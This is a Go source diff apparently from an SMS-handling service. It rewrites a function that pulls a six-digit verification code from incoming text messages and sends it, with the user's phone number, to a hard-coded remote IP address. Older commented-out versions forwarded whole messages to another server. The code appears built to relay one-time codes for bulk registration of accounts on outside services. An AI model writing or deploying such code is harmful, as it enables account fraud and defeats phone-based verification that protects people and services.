@@ -193,21 +193,34 @@ func formatMobile(ori string) string {
 
 func processJindongRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
-	exp := regexp.MustCompile(`为(\S*)（`)
+	exp := regexp.MustCompile(`\d{6}`)
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
-		log.Println(result[1])
-		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		log.Println(result[0])
+		url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
-
-	} else {
-		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
-		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
-		go send2Url(url)
+		go updateRelationSuccess(user, apid)
 	}
-	go updateRelationSuccess(user, apid)
 }
+
+// func processJindongRegister(msg string, user map[string]string, apid string) {
+// 	mobile := formatMobile(user["mobile"])
+// 	exp := regexp.MustCompile(`为(\S*)（`)
+// 	result := exp.FindStringSubmatch(msg)
+// 	if nil != result {
+// 		log.Println(result[1])
+// 		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+// 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+// 		go send2Url(url)
+
+// 	} else {
+// 		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+// 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+// 		go send2Url(url)
+// 	}
+// 	go updateRelationSuccess(user, apid)
+// }
 func processTianyiRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
 	exp := regexp.MustCompile(`验证码：(\S?)，`)
